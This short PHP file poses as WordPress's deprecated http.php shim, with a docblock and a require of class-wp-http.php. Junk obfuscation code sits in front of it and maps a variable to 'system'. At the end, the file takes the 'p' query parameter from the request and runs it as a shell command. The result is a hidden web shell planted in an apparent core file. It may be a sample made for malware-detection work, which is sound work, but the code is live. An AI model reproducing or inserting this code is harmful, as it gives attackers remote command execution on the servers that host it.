<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Core class used for managing HTTP transports and making HTTP requests.
 *
 * This file is deprecated, use 'wp-includes/class-wp-http.php' instead.
 *
 * @deprecated 5.9.0
 * @package WordPress
 */

_deprecated_file( basename( __FILE__ ), '5.9.0', WPINC . '/class-wp-http.php' );

/** WP_Http class */
require_once ABSPATH . WPINC . '/class-wp-http.php';

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>